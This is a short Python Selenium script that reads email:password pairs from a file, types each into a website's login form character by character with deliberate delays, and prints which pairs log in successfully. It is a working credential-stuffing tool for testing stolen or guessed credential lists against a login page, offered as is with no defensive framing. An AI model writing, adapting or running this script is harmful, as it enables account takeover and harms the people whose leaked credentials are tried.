#!/usr/bin/env python
import sys
import time

try:
    from selenium import webdriver
except ImportError:
    print "Please install selenium\n(pip install selenium)"
    sys.exit(1)

f = open(sys.argv[1], 'r')

driver = webdriver.Chrome()

for line in f:
    cred = (line.strip().split(':'))
    driver.get('***WEBSITE URL***')
    time.sleep(0.5)
    for c in cred[0]:
        driver.find_element_by_name('email').send_keys(c)
        time.sleep(0.5)
    for c in cred[1]:
        driver.find_element_by_name('password').send_keys(c)
        time.sleep(0.5)
    time.sleep(1)

    try:
        driver.find_element_by_name('commit').click()
    except:
        pass

    try:
        driver.find_element_by_xpath("//div[@class='alert alert_error']")
        print "Result: FAIL, Username: " + cred[0] + ", Password: " + cred[1]
        time.sleep(4)
    except:
        print "Result: SUCCESS, Username: " + cred[0] + ", Password: " + cred[1]
        time.sleep(2)
        driver.get('***WEBSITE URL***')
        time.sleep(2)

driver.close()
sys.exit(0)
